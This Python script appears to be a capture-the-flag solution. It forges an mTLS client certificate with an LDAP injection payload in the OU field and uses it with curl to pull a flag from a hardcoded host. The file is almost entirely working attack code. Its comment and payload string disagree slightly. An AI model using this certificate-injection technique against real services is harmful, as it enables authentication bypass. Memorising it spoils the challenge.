#!/usr/bin/env python3
"""Liaisons dangereuses: mTLS client cert + LDAP injection in OU field."""
import json
import subprocess
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "57.128.112.118"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 12760
BASE = f"https://{HOST}:{PORT}"
CERTDIR = "/tmp/liaisons_solve"
# LDAP filter breakout: *)(|(role=admin
OU_PAYLOAD = "*)|(role=admin"


def main() -> int:
    subprocess.run(["mkdir", "-p", CERTDIR], check=False)
    crt = f"{CERTDIR}/client.crt"
    key = f"{CERTDIR}/client.key"
    subj = f"/CN=supervisor.liaisons.local/OU={OU_PAYLOAD}"
    subprocess.run(
        [
            "openssl", "req", "-x509", "-newkey", "rsa:1024",
            "-keyout", key, "-out", crt, "-days", "1", "-nodes", "-subj", subj,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=True,
    )
    flag = subprocess.check_output(
        ["curl", "-sk", "--cert", crt, "--key", key, f"{BASE}/flag"],
        text=True,
        timeout=15,
    )
    data = json.loads(flag)
    print(data.get("flag", flag))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
